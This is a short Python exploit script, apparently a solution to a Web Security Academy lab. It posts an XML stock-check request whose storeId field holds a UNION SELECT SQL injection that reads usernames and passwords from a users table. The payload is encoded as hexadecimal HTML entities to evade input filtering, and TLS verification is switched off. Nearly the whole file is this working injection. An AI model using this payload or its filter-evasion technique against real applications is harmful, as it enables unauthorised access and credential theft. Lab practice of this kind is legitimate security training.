import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event
from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s: r.Session = r.Session()
console: Console = Console()

charset = string.ascii_letters + string.digits + "_$"
s.verify = False
print = console.print


# s.proxies = {
#     "http": "http://127.0.0.1:8080",
#     "https": "http://127.0.0.1:8080",
# }
def dec_entities(text: str) -> str:
    """Encode text using decimal HTML entities."""
    return "".join(f"&#{ord(char)};" for char in text)


def hex_entities(text: str, uppercase: bool = False) -> str:
    """Encode text using hexadecimal HTML entities."""
    fmt = "X" if uppercase else "x"
    return "".join(f"&#x{ord(char):{fmt}};" for char in text)


def main() -> None:
    URL = "https://0ac8004203fb38218034126100380072.web-security-academy.net/product/stock"
    print(hex_ := hex_entities("1 UNION SELECT username || '~' || password FROM users"))
    response: r.Response = s.post(
        URL,
        data=f"""<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>{hex_}</storeId></stockCheck>""",
        headers={"Content-Type": "application/xml"},
    )
    print(response.text)
    print(response.status_code)


if __name__ == "__main__":
    main()
